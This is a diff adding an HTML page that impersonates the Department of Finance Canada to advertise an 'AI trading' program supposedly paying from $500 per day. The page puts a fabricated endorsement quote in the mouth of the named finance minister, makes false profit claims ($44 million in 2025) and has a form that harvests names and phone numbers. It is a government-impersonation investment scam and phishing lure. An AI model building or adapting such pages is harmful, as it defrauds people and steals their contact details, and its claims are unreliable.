@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Department of Finance Canada</title>
+    <link rel="icon" type="image/png" href="images/ico.png">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <div class="flag-container">
+                <img src="images/canada.png" alt="Canada flag" class="flag">
+            </div>
+            <h1 class="header-title">Department of Finance Canada</h1>
+        </div>
+    </header>
+
+    <main class="main">
+        <section class="hero">
+            <p class="hero-text">The Government of Canada has approved a program for citizens' financial development.</p>
+            <p class="hero-subtext">You can receive from $500 per day using an advanced AI system for trading on the market.</p>
+        </section>
+
+        <section class="form-section">
+            <form class="application-form" id="applicationForm">
+                <div class="form-group">
+                    <label for="firstName">First Name</label>
+                    <input type="text" id="firstName" name="firstName" required placeholder="Enter your first name">
+                </div>
+                <div class="form-group">
+                    <label for="lastName">Last Name</label>
+                    <input type="text" id="lastName" name="lastName" required placeholder="Enter your last name">
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="Enter your phone number">
+                </div>
+                <div class="form-actions">
+                    <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
+                    <button type="button" class="change-btn" id="changeBtn" style="display: none;">Change data</button>
+                </div>
+            </form>
+        </section>
+
+        <section class="minister-section">
+            <h2 class="minister-section-title">Minister</h2>
+            <div class="minister-card">
+                <div class="minister-avatar">
+                    <img src="images/minister.jpg" alt="François-Philippe Champagne">
+                </div>
+                <div class="minister-info">
+                    <h2 class="minister-name">François-Philippe Champagne</h2>
+                    <p class="minister-quote">AIMS analyzes the global landscape in real time, including financial markets, economic news, political events, and trading charts across all major global exchanges.
+                        Based on this information, AIMS executes over 1,000 low-risk trades per minute, allowing it to diversify exposure and generate maximum profit. Using this system, Melissa and her partners generated $44 million in 2025.</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <nav class="footer-nav">
+                <a href="#">Social media</a>
+                <a href="#">Mobile applications</a>
+                <a href="#">About Canada.ca</a>
+                <a href="#">Terms and conditions</a>
+                <a href="#">Privacy</a>
+            </nav>
+            <div class="footer-brand">
+                <span class="footer-canada">Canada</span>
+                <img src="images/canada.png" alt="Canada flag" class="flag flag-small">
+            </div>
+        </div>
+    </footer>
+
+    <div class="modal-overlay" id="modalOverlay" aria-hidden="true">
+        <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+            <h3 class="modal-title" id="modalTitle">Success</h3>
+            <p class="modal-text">Application submitted successfully. Thank you!</p>
+            <button type="button" class="modal-close-btn" id="modalCloseBtn">OK</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
